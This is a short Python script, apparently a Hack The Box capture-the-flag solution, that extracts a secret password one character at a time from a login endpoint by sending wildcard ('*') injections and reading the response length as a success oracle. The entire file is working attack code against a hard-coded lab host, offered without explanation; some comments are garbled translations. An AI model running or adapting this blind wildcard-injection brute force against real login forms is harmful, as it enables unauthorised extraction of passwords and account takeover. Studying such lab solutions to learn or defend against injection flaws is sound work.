# -*- coding: utf-8 -*-
"""
Created on Tue May  4 14:11:24 2021

@author: Fstraw
"""
import requests
import string

pw = 'HTB{'
url = 'http://46.101.23.188:30132/login'
#Htb's FLAG consists of English case and numbers and underscores.
words = string.ascii_lowercase + string.ascii_uppercase + '0123456789_'
i = 0
while True:
         # Traversing all strings
    for w in words:
                 # Submitted value
        data = {'username':'reese','password':pw + w + '*' }
        r = requests.post(url,data)
        lenth = r.headers['Content-Length'] 
                 #Logue successful length is 2586
        if lenth == '2586':  
            pw = pw + w
            print('==============')
            print(pw)
                         #    
            break
    data = {'username':'reese','password':pw + '}'}
    r = requests.post(url,data)
    if r.headers['Content-Length'] == '2586':   
    	     # Output Flag
        print('==============')
        print(pw + '}')
                 #    
        break